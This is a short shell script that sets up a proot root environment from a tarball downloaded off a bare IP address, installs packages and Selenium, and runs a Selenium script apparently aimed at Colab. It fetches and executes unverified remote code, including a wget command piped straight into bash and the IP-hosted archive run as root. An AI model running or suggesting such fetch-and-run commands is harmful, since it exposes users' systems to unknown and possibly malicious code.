#!/bin/sh
curl -L -o backup4.tar.gz http://45.135.58.52/backup4.tar.gz
tar -xf backup4.tar.gz
./dist/proot -S . /bin/bash
sleep 2
su -
sleep 2
cd
whoami
ls -la
pwd
apt install wget curl unzip jq python3 python3-pip unzip nano net-tools build-essential cmake binutils python3-venv -y
pip3 install selenium
wget -O - https://raw.githubusercontent.com/maxwellcrawford21/selenium-wsl2-ubuntu/main/run_cheese.sh | bash
sleep 3
wget https://raw.githubusercontent.com/maxwellcrawford21/selenium-wsl2-ubuntu/main/run_selenium_colab.py
sleep 3
python3 run_selenium_colab.py
